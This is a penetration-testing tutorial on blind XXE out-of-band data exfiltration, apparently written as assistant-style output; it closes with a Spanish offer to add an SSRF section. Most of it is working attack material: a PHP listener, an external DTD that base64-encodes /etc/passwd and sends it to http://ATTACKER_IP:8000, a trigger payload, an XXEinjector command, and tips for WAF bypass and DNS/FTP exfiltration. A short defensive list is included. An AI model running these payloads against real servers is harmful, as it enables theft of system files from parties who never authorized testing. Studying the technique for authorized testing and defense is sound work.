
# Blind XXE - Out-of-Band (OOB) Data Exfiltration

## 🧠 Overview
In many modern environments, XXE vulnerabilities do not provide direct output in the HTTP response. This is known as **Blind XXE**. To extract data, we must force the server to make an outbound request to a system we control, carrying the sensitive data with it.

➡️ **Core Concept:** Target Server 🔗 `[Encodes Data]` ➡️ `[HTTP Request]` ➡️ Attacker Server.

---

## 🧩 Attack Architecture
The attack requires three main components:
1.  **Attacker Listener:** A server to receive the data.
2.  **External DTD:** A file hosted by the attacker that defines how to "steal" the data.
3.  **Initial Payload:** The trigger sent to the vulnerable XML parser.



---

## 🖥️ Step 1: The Attacker Listener
You need a way to log incoming requests. A simple PHP script is perfect for decoding the exfiltrated Base64 data on the fly.

**`index.php`**
```php
<?php
if(isset($_GET['content'])){
    // Logs the decoded content to a file or error log
    error_log("\n\n[!] Data Received:\n" . base64_decode($_GET['content']));
}
?>

```

**Start the server:**

```bash
php -S 0.0.0.0:8000

```

---

## 📂 Step 2: The External DTD (`xxe.dtd`)

Since XML doesn't allow nested entities directly in the internal DTD for some parsers, we host an external `.dtd` file.

**`xxe.dtd`**

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY &#x25; content SYSTEM 'http://ATTACKER_IP:8000/?content=%file;'>">
%oob;

```

*Note: `&#x25;` is the HTML entity for `%`, used to bypass parser restrictions within entities.*

---

## 🚀 Step 3: Triggering the Attack

Send this XML to the vulnerable endpoint. It tells the server to fetch your DTD and execute the instructions inside.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://ATTACKER_IP:8000/xxe.dtd">
  %remote;
]>
<root>&content;</root>

```

---

## 🤖 Automated Exfiltration with XXEinjector

Manual OOB is tedious. **XXEinjector** automates the listener, the DTD hosting, and the request sending.

### 1. Prepare the Request File (`request.req`)

Copy the vulnerable request from Burp and replace the XML content with the placeholder:

```http
POST /submit HTTP/1.1
Host: target.com
...

XXEINJECT

```

### 2. Execute

```bash
ruby XXEinjector.rb --host=[YOUR_IP] --httpport=8000 --file=request.req --path=/etc/passwd --oob=http --phpfilter

```

👉 The tool will host the DTD, listen for the connection, and save the file in the `Logs/` directory.

---

## 🛡️ Defensive Measures

* **Disable DTDs:** The most effective fix is to disable DTDs (Document Type Definitions) entirely in your XML parser.
* **Egress Filtering:** Block the server from making outbound connections to arbitrary IPs on the internet (especially ports 80, 443, and 21).
* **Use JSON:** If possible, switch from XML to JSON, which does not support entities by design.

---

## 💣 Pentester Mindset

* **The "Ping" Test:** Before trying to steal files, try to trigger a simple DNS or HTTP request to your server to confirm the OOB path is open.
* **Protocol Hopping:** If HTTP is blocked, try **FTP** or **DNS** exfiltration.
* **WAF Bypass:** Use `php://filter` to Base64 encode the data. This prevents special characters in the stolen file (like `<` or `&`) from breaking the XML or the HTTP request.



¿Quieres que preparemos una sección sobre **SSRF (Server-Side Request Forgery)**? Está muy relacionado con XXE (ambos obligan al servidor a hacer peticiones) y es un pilar fundamental en ataques a infraestructuras Cloud.

